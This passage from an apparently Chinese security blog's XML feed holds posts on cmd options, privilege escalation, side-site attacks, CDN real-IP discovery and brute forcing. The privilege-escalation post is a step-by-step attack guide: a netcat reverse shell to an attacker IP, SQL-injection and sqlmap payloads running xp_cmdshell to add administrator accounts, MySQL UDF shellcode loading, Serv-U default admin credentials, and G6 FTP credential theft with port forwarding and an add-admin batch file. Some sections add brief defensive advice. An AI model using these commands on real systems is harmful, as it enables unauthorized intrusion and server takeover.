string">'%'</span> where user <span class="token operator">=</span> <span class="token string">'root'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新权限：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flush privileges<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cmd的一些参数</title>
      <link href="/2022/05/03/%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%80%E4%BA%9Bcmd%E5%8F%82%E6%95%B0/"/>
      <url>/2022/05/03/%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%80%E4%BA%9Bcmd%E5%8F%82%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="常见的一些cmd参数"><a href="#常见的一些cmd参数" class="headerlink" title="常见的一些cmd参数"></a>常见的一些cmd参数</h1><pre class="line-numbers language-none"><code class="language-none">&#x2F;C执行命令后终止&#x2F;K  执行命令后保留&#x2F;S修改&#x2F;C或&#x2F;K之后的字符串处理&#x2F;Q关闭回显&#x2F;D禁止从注册表执行AutoRun命令&#x2F;A使管道或文件的内部命令输出成为ANSI&#x2F;U使管道或文件的内部命令输出成为Unicode<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>提权</title>
      <link href="/2022/04/29/%E6%8F%90%E6%9D%83/"/>
      <url>/2022/04/29/%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>提权是将服务器的普通用户提升为管理员用户的一种操作，提权常常用于辅助旁注攻击</p><h2 id="溢出提权"><a href="#溢出提权" class="headerlink" title="溢出提权"></a>溢出提权</h2><p>溢出提权是指攻击者利用系统本身或系统中软件的漏洞来获取root权限</p><h3 id="远程溢出"><a href="#远程溢出" class="headerlink" title="远程溢出"></a>远程溢出</h3><p>远程溢出是指攻击者只需要与服务器建立连接，然后根据系统的漏洞，使用相应的溢出程序，即可获取到远程服务器的root权限<br>远程溢出的另一种表现则是针对服务器已经安装好的组件溢出，比如office等，攻击者可能会通过office漏洞进行远程溢出操作<br>MS-08067溢出漏洞是远程溢出的代表</p><h4 id="远程溢出存在的问题"><a href="#远程溢出存在的问题" class="headerlink" title="远程溢出存在的问题"></a>远程溢出存在的问题</h4><p>服务器通常针对远程溢出漏洞打了补丁，这样就会导致旧的溢出程序一般不会再起作用，而新的溢出漏洞又少之又少，所以攻击者在攻击目标服务器时使用远程溢出这种攻击手段是比较少的</p><h3 id="本地溢出"><a href="#本地溢出" class="headerlink" title="本地溢出"></a>本地溢出</h3><p>本地溢出是指在本地溢出提权时，攻击者首先需要有服务器一个用户，并且这个用户需要有执行权限才可能发起提权。攻击者通常会向服务器上传本地溢出程序，然后在服务器端执行，如果系统存在漏洞，就会溢出root权限<br>本地溢出的另一种表现则是针对操作系统上的软件溢出。这类本地溢出与操作系统本地溢出相同，利用方式也一样</p><h4 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h4><p>第一步:查看服务器内核版本及当前用户的ID、所属群组的ID</p><pre class="line-numbers language-none"><code class="language-none">id &amp; uname -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二步:本地接收服务器端数据，使用nc监听本地端口，等待服务器端反向连接</p><pre class="line-numbers language-none"><code class="language-none">nc -nvlp 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注:本地计算机的IP必须是外网，否则需要端口转发<br>第三步:服务器端shell(执行命令通道)反弹，反弹的方法有多种,如:nc</p><pre class="line-numbers language-none"><code class="language-none">nc attackerIP 8888 -e &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第四步:服务器反弹shell之后，将本地溢出exp上传到目标服务器中执行。如果目标服务器存在本地溢出漏洞，则会提权成功</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;exp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h4><p>第一步:探测目标服务器支持的脚本语言及脚本语言有没有执行命令权限(服务器是否支持脚本语言执行命令所需要的组件)，如:asp、asp.net、jsp、php<br>各脚本语言执行系统命令需要依靠的组件</p><table><thead><tr><th>脚本语言</th><th>执行命令所需要的组件</th></tr></thead><tbody><tr><td>asp</td><td>wscript.shell命令执行组件</td></tr><tr><td>asp.net</td><td>.net framework</td></tr><tr><td>jsp</td><td>jvm</td></tr></tbody></table><p>注:asp.net在多数情况下都可以调用系统命令；jsp一般都可以直接调用系统命令，很多时候jsp是以administrator权限来运行的<br>第二步:如果服务器支持相应的组件，就可以向目标服务器上传本地溢出程序，然后执行<br>注:exp所在目录必须有可执行权限，否则将无法执行；在寻找可写，可执行的目录时，一般将第三方软件作为入口点，如：软件的日志目录。这些目录一般都可能拥有可写，可执行权限</p><h4 id="本地溢出提权的关键"><a href="#本地溢出提权的关键" class="headerlink" title="本地溢出提权的关键"></a>本地溢出提权的关键</h4><p>命令执行权限</p><h2 id="第三方组件提权"><a href="#第三方组件提权" class="headerlink" title="第三方组件提权"></a>第三方组件提权</h2><p>服务器运行时可能需要很多组件支持，如:.net framework,pcanywhere,mysql,sql server等，攻击者有可能通过这类组件进行提权操作</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="服务器支持的脚本语言"><a href="#服务器支持的脚本语言" class="headerlink" title="服务器支持的脚本语言"></a>服务器支持的脚本语言</h4><p>如果服务器支持的脚本语言恰好是以administrator权限来运行的，那么攻击者就可以直接以administrator身份执行系统命令，如添加管理员用户</p><h4 id="服务器端口探测"><a href="#服务器端口探测" class="headerlink" title="服务器端口探测"></a>服务器端口探测</h4><p>可以通过服务器端口探测查看服务器安装了哪些软件，就可以针对某一软件有目的，针对性地提权</p><h5 id="探测服务器端口的三种方式"><a href="#探测服务器端口的三种方式" class="headerlink" title="探测服务器端口的三种方式"></a>探测服务器端口的三种方式</h5><ul><li>本地扫描<br>使用webshell自带的端口扫描功能</li><li>远程扫描<br>在外部通过端口扫描工具扫描,如:nmap</li><li>执行系统命令查看开放的端口<pre class="line-numbers language-none"><code class="language-none">netstat -an<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="搜集路径信息"><a href="#搜集路径信息" class="headerlink" title="搜集路径信息"></a>搜集路径信息</h4><p>可以访问的目录:可能存放敏感文件，软件的安装路径，注册表:保存着一些软件的安装信息，如HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\services\保存着所有的服务信息，可以看到一些软件的安装路径</p><h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><p>数据库提权防御:数据库提权靠的是数据库用户的权限，所以数据库用户一定要降权，并且要设置复杂的密码。</p><h4 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h4><p>SQL server提权主要依据一个特殊的存储过程”xp_cmdshell”,通过这个存储过程可以调用系统命令<br>添加管理员账号</p><pre class="line-numbers language-none"><code class="language-none">net user 666 999 &#x2F;add &amp; net localgroup administrators 666 &#x2F;add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注:使用SQL server提权需要有sysadmin权限，因为只有在sysadmin权限下才可以使用xp_cmdshell存储过程，所以普通用户无法使用SQL server提权</p><h5 id="SQL-SERVER提权的两种方法"><a href="#SQL-SERVER提权的两种方法" class="headerlink" title="SQL SERVER提权的两种方法"></a>SQL SERVER提权的两种方法</h5><ul><li>注入点<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.xxser.com&#x2F;user.aspx?id&#x3D;1;exec master..xp_cmdshell &#39;net user xxx xxx &#x2F;add&#39; -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>使用SQL注入工具直接执行cmd命令<pre class="line-numbers language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;www.xxser.com&#x2F;user.aspx?id&#x3D;1&quot; --os-cmd&#x3D;&quot;net user xxx xxx &#x2F;add&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>得到数据库账户信息(获取了sa用户的密码)<ul><li>外连接提权<br>  外连接提权是在服务器外部连接数据库提权<br>  前提条件:数据库开启远程连接<br>  提权原理:远程连接数据库，通过执行SQL语句(调用xp_cmdshell存储过程)进行提权</li><li>本地连接提权<br>  本地连接提权是在服务器端连接数据库提权<br>  前提条件:已经获取到网站权限，可以操作网站脚本<br>  提权原理：在服务器本地连接数据库，通过执行SQL语句(调用xp_cmdshell存储过程)进行提权。shell脚本提权就是此原理<br>  提权方法:shell脚本提权、菜刀</li></ul></li></ul><p>注:如果xp_cmdshell存储过程没有开启，需要先开启，然后再提权<br>开启xp_cmdshell</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span>go<span class="token keyword">reconfigure</span>go<span class="token keyword">exec</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span><span class="token number">1</span>go<span class="token keyword">reconfigure</span>go<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关闭xp_cmdshell</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span>go<span class="token keyword">reconfigure</span>go<span class="token keyword">exec</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span><span class="token number">0</span>go<span class="token keyword">reconfigure</span>go<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注:有时即使不是sa账户，也可以使用xp_cmdshell提权，且非sa账户也可能是sysadmin权限<br>xp_cmdshell是SQL SERVER提权最常用的方式，也可以使用其他存储过程：sqlserveragent,sp_oacreate,xp_regwrite</p><h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><p>mysql中没有直接提供类似xp_cmdshell这样的存储过程，但mysql可以自定义函数，通过自定义函数可以做到与xp_cmdshell类似的效果</p><h5 id="UDF提权-User-defined-Function-用户定义函数"><a href="#UDF提权-User-defined-Function-用户定义函数" class="headerlink" title="UDF提权(User defined Function,用户定义函数)"></a>UDF提权(User defined Function,用户定义函数)</h5><ul><li><p>UDF提权步骤<br>第一步：创建临时表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> <span class="token keyword">TempTable</span><span class="token punctuation">(</span>udf <span class="token keyword">blob</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二步：插入shellcode</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> <span class="token keyword">TempTable</span> <span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token keyword">convert</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注:需要插入命令执行的shellcode<br>第三步：导出udf.dll</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> udf <span class="token keyword">from</span> <span class="token keyword">TempTable</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'C:\Windows\udf.dll'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：需要注意Mysql版本。mysql 5.0以上版本udf.dll必须要导入到系统目录：因为第五步需要引用udf.dll,而mysql 5.0以上版本不允许有路径存在，所以mysql 5.0以上版本一般会导入到“C:\Windows”目录中。mysql 5.1以上版本udf.dll只能导入到“mysql安装目录&#x2F;lib&#x2F;plugin”目录中<br>第四步：删除临时表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token keyword">TempTable</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第五步：创建cmdshell函数</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">function</span> cmdshell <span class="token keyword">returns</span> string <span class="token keyword">soname</span> <span class="token string">'udf.dll'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第六步：执行命令</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> cmdshell<span class="token punctuation">(</span><span class="token string">'command'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第七步：删除cmdshell函数</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">function</span> cmdshell<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>sqlmap mysql udf提权<br>参考链接:<a href="https://blog.csdn.net/weixin_35715474/article/details/115890685">https://blog.csdn.net/weixin_35715474/article/details/115890685</a></p></li><li><p>mysql自动化提权脚本(原理基于udf提权)</p></li></ul><p>注:查看mysql数据库中所有的账户信息</p><pre class="line-numbers language-none"><code class="language-none">mysql安装目录&#x2F;data&#x2F;mysql&#x2F;user.MYD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开user.MYD文件</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/user.png" class=""><p>“)”前面的字符串是账号，”)”后面的字符串是加密后的密码<br>注:mysql提权并不局限于udf,还有一些其他的提权方式,如:利用mysql写文件的特性将木马cmd命令写入到启动项中，当服务器重启时就会执行</p><h3 id="FTP提权"><a href="#FTP提权" class="headerlink" title="FTP提权"></a>FTP提权</h3><p>当ftp软件用户的权限配置错误或权限过大时就可以利用ftp软件执行系统命令来提权</p><h4 id="弱口令提权"><a href="#弱口令提权" class="headerlink" title="弱口令提权"></a>弱口令提权</h4><p>通过爆破或弱口令登陆目标FTP服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ftp</span> <span class="token number">192.168</span>.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果获取到的目标FTP服务的账号具有执行权限，我们就可以执行以下命令来提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">quote site <span class="token builtin class-name">exec</span> net user <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span> /addquote site <span class="token builtin class-name">exec</span> net localgroup administrators /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注：有些环境并不支持quote site exec这种方式执行命令<br>示例：<br>serv-u执行权限</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/serv-u%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90.png" class=""><p>serv-u弱口令提权</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/ftp%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%8F%90%E6%9D%83.png" class=""><h4 id="webshell提权"><a href="#webshell提权" class="headerlink" title="webshell提权"></a>webshell提权</h4><h5 id="Serv-U提权"><a href="#Serv-U提权" class="headerlink" title="Serv-U提权"></a>Serv-U提权</h5><ul><li>通过serv-u默认管理用户添加FTP用户进行提权<br>安装serv-u后，默认监听端口43958<br>serv-u有一个默认管理用户，用户名：localadministrator  密码：#l@$ak#.lk;0@P<br>通过这个默认管理用户可以添加FTP用户，给添加的FTP用户执行权限，就可以执行命令来提权<br>一般webshell都集成了serv-u自动化提权的功能，例：<img src="/2022/04/29/%E6%8F%90%E6%9D%83/serv-u%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8F%90%E6%9D%83.png" class="">一般没有回显，可以通过返回状态判断命令执行成功与否： 200 EXEC command successful(命令执行成功)，其他则表示命令执行失败。<br>如果serv-u的默认管理用户的密码被修改了,我们可以查找serv-u安装目录下的ServUAdmin.exe,用16进制编辑器打开ServUAdmin.exe,就可以看到管理员的账户信息。<img src="/2022/04/29/%E6%8F%90%E6%9D%83/servuadmin.png" class=""></li><li>通过serv-u配置文件添加FTP用户进行提权（需要有修改权限，serv-u服务需要重启）<br>首先在serv-u安装目录下查找配置文件ServUDaemon.ini,该配置文件保存了serv-u FTP用户信息<img src="/2022/04/29/%E6%8F%90%E6%9D%83/servudaemon.png" class="">打开ServUDaemon.ini配置文件，在其中添加FTP用户test<img src="/2022/04/29/%E6%8F%90%E6%9D%83/test.png" class="">serv-u就会成功添加test用户，test用户具有执行权限<img src="/2022/04/29/%E6%8F%90%E6%9D%83/test%E7%94%A8%E6%88%B7.png" class="">此时就可以利用test用户执行系统命令来添加系统管理员。</li></ul><h5 id="G6-FTP提权"><a href="#G6-FTP提权" class="headerlink" title="G6 FTP提权"></a>G6 FTP提权</h5><p>在G6 FTP安装目录下找到文件夹RemoteAdmin</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/remoteadmin.png" class=""><p>打开RemoteAdmin目录，找到文件Remote.ini(远程管理账户信息）</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/remoteini.png" class=""><p>打开Remote.ini文件，就可以获得管理员的账号和密码</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/admin.png" class=""><p>解密后即可得到管理员的明文密码</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/cmd5.png" class=""><p>因为G6 FTP默认不允许远程连接，因此我们需要进行端口转发<br>在服务器端执行命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lcx.exe <span class="token parameter variable">-tran</span> <span class="token number">1234</span> <span class="token number">127.0</span>.0.1 <span class="token number">8021</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：G6 FTP安装后默认监听8021端口<br>端口转发成功后我们就可以在本地安装G6 FTP进行连接</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/G6.png" class=""><p>点击ok，连接创建成功</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/conn.png" class=""><p>点击我们创建的连接</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/login.png" class=""><p>输入管理员账号密码即可连接成功</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/success.png" class=""><p>连接成功后选择”域——&gt;任意域——&gt;用户”,新建FTP用户</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/newuser.png" class=""><p>输入要创建的FTP用户名与密码</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/passwd.png" class=""><p>输入要创建的FTP用户的家目录</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/home.png" class=""><p>点击finish,FTP用户创建成功</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/index.png" class=""><p>选择访问权限选项，赋予用户全部权限</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/access.png" class=""><p>向服务器上传一个adduser.bat文件，文件内容如下所示</p><pre class="line-numbers language-bat" data-language="bat"><code class="language-bat">@echo offnet user test 123.com &#x2F;addnet localgroup administrators test &#x2F;add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后选择site命令选项，新建一个site命令</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/command.png" class=""><p>输入命令名，执行文件路径</p><img src="/2022/04/29/%E6%8F%90%E6%9D%83/adduser.png" class="">]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>旁注攻击</title>
      <link href="/2022/04/28/%E6%97%81%E6%B3%A8%E6%94%BB%E5%87%BB/"/>
      <url>/2022/04/28/%E6%97%81%E6%B3%A8%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="旁注攻击"><a href="#旁注攻击" class="headerlink" title="旁注攻击"></a>旁注攻击</h1><h2 id="旁注攻击简介"><a href="#旁注攻击简介" class="headerlink" title="旁注攻击简介"></a>旁注攻击简介</h2><p>攻击者在对目标站点渗透的过程中，由于在目标站点找不到安全漏洞导致对目标无从下手时，就可以通过渗透同服务器的其他站点来渗透到目标站点，从而获取目标站点的权限</p><h2 id="IP逆向查询"><a href="#IP逆向查询" class="headerlink" title="IP逆向查询"></a>IP逆向查询</h2><p><a href="http://www.yougetsignal.com/tools/web-sites-on-web-server">http://www.yougetsignal.com/tools/web-sites-on-web-server</a><br><a href="http://tool.chinaz.com/same">http://tool.chinaz.com/same</a><br><a href="http://dns.aizhan.com/">http://dns.aizhan.com</a><br><a href="http://www.114best.com/ip/">http://www.114best.com/ip/</a></p><h2 id="SQL跨库查询"><a href="#SQL跨库查询" class="headerlink" title="SQL跨库查询"></a>SQL跨库查询</h2><p>SQL跨库查询即为SQL旁注，是管理员没有分配好数据库用户权限所导致的问题</p><h3 id="SQL跨库原理"><a href="#SQL跨库原理" class="headerlink" title="SQL跨库原理"></a>SQL跨库原理</h3><p>通常，一个数据库中会有多个用户，用户之间互不干扰。但如果数据库用户权限分配不当，用户之间就可能存在越权操作</p><img src="/2022/04/28/%E6%97%81%E6%B3%A8%E6%94%BB%E5%87%BB/sql%E8%B7%A8%E5%BA%93.png" class=""><p>如图,某台服务器安装了Mysql数据库，数据库中有两个用户:用户A和用户B，用户A对应的数据库为数据库A，用户B对应的数据库为数据库B。用户A可以操作数据库A的数据，但不可以操作数据库B的数据。如果数据库用户权限分配不当导致用户A可以操作数据库B的数据，则就会造成越权(也称为跨库查询)</p><h3 id="防止SQL跨库查询"><a href="#防止SQL跨库查询" class="headerlink" title="防止SQL跨库查询"></a>防止SQL跨库查询</h3><p>在分配用户权限时，使用权限最小原则。即所分配的权限在不干扰程序运行的情况下，分配最小的权限</p><h2 id="目录越权"><a href="#目录越权" class="headerlink" title="目录越权"></a>目录越权</h2><p>每个web应用程序(网站程序)都存在于一个单独的目录中,彼此之间互不干扰，独立运行。但如果服务器管理员配置不当，就会发生目录越权的风险</p><h3 id="目录越权原理"><a href="#目录越权原理" class="headerlink" title="目录越权原理"></a>目录越权原理</h3><img src="/2022/04/28/%E6%97%81%E6%B3%A8%E6%94%BB%E5%87%BB/%E7%9B%AE%E5%BD%95%E8%B6%8A%E6%9D%83.png" class=""><p>如图，网站对应的程序只能在当前存放目录中操作，不应该有其他目录的读写权限。如果管理员配置不当，使网站对应的程序有了其他目录的读写权限，一旦攻击者获得了该网站的权限，就可以利用目录越权向同服务器的其他网站目录中写入shell，从而控制其他网站</p><h2 id="构造注入点"><a href="#构造注入点" class="headerlink" title="构造注入点"></a>构造注入点</h2><p>当cracker通过某个旁站的漏洞获得了该网站的权限，但由于目录权限做的比较严格导致cracker无法向目标网站目录写入shell。这时cracker就可以在获得权限的网站的目录下构造注入点，然后就可以通过该注入点获取数据库权限。如果数据库权限是db_owner,就可以进行数据备份，将shell备份到指定的目录；如果数据库权限足够大，就可以提权</p><h3 id="注入点构造"><a href="#注入点构造" class="headerlink" title="注入点构造"></a>注入点构造</h3><h4 id="aspx版"><a href="#aspx版" class="headerlink" title="aspx版"></a>aspx版</h4><img src="/2022/04/28/%E6%97%81%E6%B3%A8%E6%94%BB%E5%87%BB/aspx.png" class=""><h4 id="php版"><a href="#php版" class="headerlink" title="php版"></a>php版</h4><img src="/2022/04/28/%E6%97%81%E6%B3%A8%E6%94%BB%E5%87%BB/php.png" class=""><h4 id="jsp版"><a href="#jsp版" class="headerlink" title="jsp版"></a>jsp版</h4><img src="/2022/04/28/%E6%97%81%E6%B3%A8%E6%94%BB%E5%87%BB/jsp.png" class=""><h4 id="参考案例"><a href="#参考案例" class="headerlink" title="参考案例"></a>参考案例</h4><p><a href="https://blog.csdn.net/weixin_30512785/article/details/99546848?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-1.pc_relevant_default&spm=1001.2101.3001.4242.2&utm_relevant_index=4">https://blog.csdn.net/weixin_30512785/article/details/99546848?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-1.pc_relevant_default&amp;spm=1001.2101.3001.4242.2&amp;utm_relevant_index=4</a></p><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><h3 id="CDN简介"><a href="#CDN简介" class="headerlink" title="CDN简介"></a>CDN简介</h3><p>CDN的全称是Content Delivery Network，即内容分发网络。<br>CDN的最终目的是用来网络加速</p><h3 id="CDN工作原理"><a href="#CDN工作原理" class="headerlink" title="CDN工作原理"></a>CDN工作原理</h3><p>CDN就是将原服务器上可以缓存的文件(静态文件，图片，JS，CSS等)下载到缓存服务器。当用户访问域名时，将会访问缓存服务器，而不是直接去访问源服务器</p><h3 id="CDN流程图"><a href="#CDN流程图" class="headerlink" title="CDN流程图"></a>CDN流程图</h3><img src="/2022/04/28/%E6%97%81%E6%B3%A8%E6%94%BB%E5%87%BB/cdn.png" class=""><h3 id="CDN下常见的搜集真实IP的方法"><a href="#CDN下常见的搜集真实IP的方法" class="headerlink" title="CDN下常见的搜集真实IP的方法"></a>CDN下常见的搜集真实IP的方法</h3><h4 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo()"></a>phpinfo()</h4><p>phpinfo()函数可以显示服务器端的一些配置信息，其中包括服务器端的IP地址。<br>phpinfo()是php的函数，asp,aspx,jsp都有类似的函数</p><h4 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h4><p>很多网站一般会对主站进行CDN加速，而忽略了一些子域名。如果这些子域名恰好与主站存放于同一台服务器上的话，我们可以通过搜集未进行CDN加速的子域名从而获取服务器的真实IP地址</p><h4 id="观察IP变化"><a href="#观察IP变化" class="headerlink" title="观察IP变化"></a>观察IP变化</h4><p>有些网站提供了查看域名服务器IP地址变化的功能，通过IP地址变化，我们可能猜测出服务器的真实IP地址<br><a href="https://sitereport.netcraft.com/">https://sitereport.netcraft.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>暴力破解</title>
      <link href="/2022/04/27/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
      <url>/2022/04/27/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="暴力破解常用工具"><a href="#暴力破解常用工具" class="headerlink" title="暴力破解常用工具"></a>暴力破解常用工具</h2><ul><li>hydra</li><li>medusa</li><li>burp</li></ul><h3 id="针对wordpress的暴力破解程序"><a href="#针对wordpress的暴力破解程序" class="headerlink" title="针对wordpress的暴力破解程序"></a>针对wordpress的暴力破解程序</h3><ul><li>wpscan</li></ul><h2 id="OA系统暴力破解中搜集用户名的常用方法"><a href="#OA系统暴力破解中搜集用户名的常用方法" class="headerlink" title="OA系统暴力破解中搜集用户名的常用方法"></a>OA系统暴力破解中搜集用户名的常用方法</h2><ul><li>通过邮箱搜集</li><li>通过错误提示搜集</li></ul><h2 id="验证码暴力破解"><a href="#验证码暴力破解" class="headerlink" title="验证码暴力破解"></a>验证码暴力破解</h2><h3 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h3><p>密码找回，修改密码，交易支付等敏感操作</p><h3 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h3><p>在对验证码进行验证时，如果验证码的有效时间很长，攻击者就可以在验证码的有效时长内暴力破解出该验证码</p><h2 id="暴力破解防御"><a href="#暴力破解防御" class="headerlink" title="暴力破解防御"></a>暴力破解防御</h2><h3 id="密码的复杂性"><a href="#密码的复杂性" class="headerlink" title="密码的复杂性"></a>密码的复杂性</h3><h4 id="常见的密码设定策略"><a href="#常见的密码设定策略" class="headerlink" title="常见的密码设定策略"></a>常见的密码设定策略</h4><ul><li>密码长度最低6位以上，尽量在8位至12位数之间</li><li>绝不允许以关键特征为密码，如：手机号，邮箱等</li><li>用户名与密码不能有任何联系</li><li>增加密码的复杂性，不能为弱密码，如:至少1个小写字母，至少1个大写字母，至少1个数字，至少1个特殊字符</li></ul><h3 id="验证码措施-CAPTCHA"><a href="#验证码措施-CAPTCHA" class="headerlink" title="验证码措施(CAPTCHA)"></a>验证码措施(CAPTCHA)</h3><h4 id="验证码简介"><a href="#验证码简介" class="headerlink" title="验证码简介"></a>验证码简介</h4><p>Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)<br>用来区分用户是”机器人”还是正常用户</p><h4 id="验证码的分类"><a href="#验证码的分类" class="headerlink" title="验证码的分类"></a>验证码的分类</h4><p>图片验证码，手机验证码，邮箱验证码，答题验证码等</p><h4 id="针对验证码的绕过"><a href="#针对验证码的绕过" class="headerlink" title="针对验证码的绕过"></a>针对验证码的绕过</h4><ul><li>验证码识别</li><li>验证码漏洞</li></ul><h3 id="登陆日志-限制登陆次数"><a href="#登陆日志-限制登陆次数" class="headerlink" title="登陆日志(限制登陆次数)"></a>登陆日志(限制登陆次数)</h3><p>当用户登陆时，不是直接登陆，而是先在登陆日志中查找用户登陆错误的次数、时间等信息。如果操作连续错误、失败，那么将采取某种措施,如：10分钟后再登陆等</p>]]></content>
      
      
      <categories>
          
